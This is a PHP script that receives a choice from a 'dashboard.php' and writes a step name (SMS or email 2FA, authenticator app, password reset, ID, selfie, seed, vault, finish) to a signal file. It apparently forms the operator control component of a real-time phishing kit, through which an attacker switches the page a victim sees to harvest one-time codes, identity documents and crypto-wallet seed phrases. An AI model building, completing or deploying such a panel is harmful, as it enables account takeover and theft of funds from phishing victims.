<?php
// Handle the signal from dashboard.php
if (isset($_POST['selectedOption'])) {
    // Check the selected option
    $selectedOption = $_POST['selectedOption'];
    
    // Define the signal file name
    $signalFile = 'signal.txt'; // You can change the file name if needed

    // Handle different selected options
    switch ($selectedOption) {
        case 'sms-2fa':
            // Create a signal file with content 'sms-2fa'
            file_put_contents($signalFile, 'sms-2fa');
            echo 'Signal received for sms-2fa';
            break;
        case 'password-reset':
            // Create a signal file with content 'sms-2fa'
            file_put_contents($signalFile, 'password-reset');
            echo 'Signal received for password-reset';
            break;
            
        case 'auth-app':
            // Create a signal file with content 'auth-app'
            file_put_contents($signalFile, 'auth-app');
            echo 'Signal received for auth-app';
            break;

        case 'email-2fa':
            // Create a signal file with content 'email-2fa'
            file_put_contents($signalFile, 'email-2fa');
            echo 'Signal received for email-2fa';
            break;

        case 'url':
            // Create a signal file with content 'url'
            file_put_contents($signalFile, 'url');
            echo 'Signal received for url';
            break;

        case 'id':
            // Create a signal file with content 'id'
            file_put_contents($signalFile, 'id');
            echo 'Signal received for id';
            break;

        case 'selfie':
            // Create a signal file with content 'selfie'
            file_put_contents($signalFile, 'selfie');
            echo 'Signal received for selfie';
            break;

        case 'seed':
            // Create a signal file with content 'seed'
            file_put_contents($signalFile, 'seed');
            echo 'Signal received for seed';
            break;

        case 'vault':
            // Create a signal file with content 'vault'
            file_put_contents($signalFile, 'vault');
            echo 'Signal received for vault';
            break;

        case 'finish':
            file_put_contents($signalFile, 'finish');
            echo 'Signal received for finish';
            break;

        default:
            echo 'Invalid signal';
            break;
    }
} else {
    echo 'No signal received';
}
?>